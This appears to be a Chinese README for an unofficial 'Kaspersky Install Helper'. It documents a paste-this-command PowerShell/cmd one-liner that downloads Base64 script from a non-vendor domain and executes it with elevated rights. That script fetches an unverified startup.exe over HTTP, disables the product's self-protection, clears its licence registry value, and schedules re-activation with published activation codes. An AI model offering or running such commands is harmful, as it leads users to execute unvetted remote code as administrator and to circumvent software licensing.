# Kaspersky Install Helper v2.0.0 - 网络请求地址说明

> v2.0.0 起，下发脚本为「新旧融合版」：同一份脚本同时兼容 **cmd 双击(.bat)** 与 **PowerShell `iex`** 运行，
> 双语自动识别（中/英），图形界面优先、控制台自动备选，支持版本/激活码选择与每 28 天自动续期。

## 一、脚本入口（一键命令）

### 加载器地址
| 地址 | 说明 |
|------|------|
| `https://kbsj.yuholt.cn/` | 脚本主入口，存放 Base64 编码的融合脚本（PowerShell + cmd polyglot） |

### 调用方式

**PowerShell：**
```powershell
$w=New-Object Net.WebClient;$w.Encoding=[Text.Encoding]::UTF8;iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($w.DownloadString('https://kbsj.yuholt.cn/'))))
```

**CMD：**
```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object Net.WebClient;$w.Encoding=[Text.Encoding]::UTF8;iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($w.DownloadString('https://kbsj.yuholt.cn/'))))"
```

> 也可将脚本另存为 `.bat` 文件双击运行：文件头部的 cmd 启动器会自动申请管理员权限(UAC)，
> 并调用 PowerShell 执行主体逻辑；通过 `iex` 在线运行时，该 cmd 头部位于 PowerShell 块注释 `<# ... #>` 内会被自动忽略。

### 作用
从该地址下载 Base64 编码的脚本内容，解码后直接在 PowerShell 中执行，实现一键部署安装流程。

---

## 二、文件下载服务器

### 基础地址
| 地址 | 说明 |
|------|------|
| `http://gc2.yuholt.cn:5000` | 文件下载服务器根地址（HTTP，端口5000） |

### 下载的文件

| 文件路径 | 文件名 | 作用 |
|---------|--------|------|
| `/uploads/startup.exe` | startup.exe | Kaspersky 安装包主程序，下载后自动执行安装 |

### 调用方式（脚本内部）
```powershell
$url = "http://gc2.yuholt.cn:5000/uploads/startup.exe"
$webRequest = [System.Net.HttpWebRequest]::Create($url)
$response = $webRequest.GetResponse()
# ... 流式下载到脚本所在目录（带进度），若文件已存在则跳过下载，然后执行
```

### 作用
将安装包下载到脚本所在目录（缺失才下载），下载完成后以 `/pSelfProtection=0` 启动安装程序。

---

## 三、地址汇总

| # | 地址 | 协议 | 端口 | 用途 |
|---|------|------|------|------|
| 1 | `https://kbsj.yuholt.cn/` | HTTPS | 443 | 脚本加载器（存放编码后的融合脚本） |
| 2 | `http://gc2.yuholt.cn:5000/uploads/startup.exe` | HTTP | 5000 | 安装包下载地址 |

---

## 四、客户端执行流程

```
用户执行一键命令 / 双击 .bat
       │
       ▼
┌─────────────────────┐
│  kbsj.yuholt.cn     │  ← HTTPS 下载 Base64 编码的融合脚本
│  (脚本加载器)         │
└─────────┬───────────┘
          │ 解码 & 执行（自动提权 / UAC）
          ▼
┌──────────────────────────────┐
│  融合脚本运行（本地）          │
│  · 双语识别(中/英)             │
│  · 公告/公益声明弹窗           │
│  · 选择：是否自动续期 + 版本    │  ← WinForms 弹窗，失败自动降级控制台
│    (标准版/Plus版/优选版)      │
└─────────┬────────────────────┘
          │ 按需下载安装包
          ▼
┌─────────────────────────────────┐
│  gc2.yuholt.cn:5000             │  ← HTTP 下载 startup.exe（已存在则跳过）
│  /uploads/startup.exe           │
└─────────┬───────────────────────┘
          │ 启动安装 /pSelfProtection=0
          ▼
┌──────────────────────────────┐
│  监控注册表并清空 ProductStatus │  ← AVP*\environment（激活）
└─────────┬────────────────────┘
          │ 若选择了自动续期
          ▼
┌──────────────────────────────────────────┐
│  创建计划任务（每 28 天）                   │
│  avp.com LICENSE /add <激活码>             │
│  并修改任务 XML（StartWhenAvailable 等）    │
│  待 avp.exe 启动后立即续期一次              │
└────────────────────────────────────────────┘
```

---

## 五、版本与激活码

| 版本 | 名称 | 激活码 |
|------|------|--------|
| 1 | 卡巴斯基 标准版 (Standard) | `GAJPU-UTD18-3B2JJ-62CQ2` |
| 2 | 卡巴斯基 Plus 版 | `GE86F-9WQRM-KK5PG-1ZE2W` |
| 3 | 卡巴斯基 优选版 (Premium) | `5AP55-UFAT1-QUMNN-7CUDZ` |

> 激活码仅在「开启自动续期」时用于计划任务；如果不开启自动续期，则不会写入激活码。

---

## 六、注意事项

1. **脚本加载器** (`kbsj.yuholt.cn`) 使用 HTTPS，确保传输安全
2. **文件服务器** (`gc2.yuholt.cn:5000`) 使用 HTTP，如需更安全可升级为 HTTPS
3. 如果下载返回 **502**，说明文件服务器后端服务异常，需检查服务器状态
4. 脚本会自动检测系统语言，支持中文/英文双语界面
5. 需要 **管理员权限** 运行；cmd/.bat 方式会自动弹 UAC 提权
6. 运行过程中**请勿关闭**进度窗口和 PowerShell 窗口，否则可能导致激活失败需重新卸载安装
7. 加载器对客户端做 **UA 过滤**（仅 PowerShell）与 **IP 限流**（每 IP 每小时 10 次），并向脚本注入**零宽字符水印**用于溯源（详见后台 API 文档）
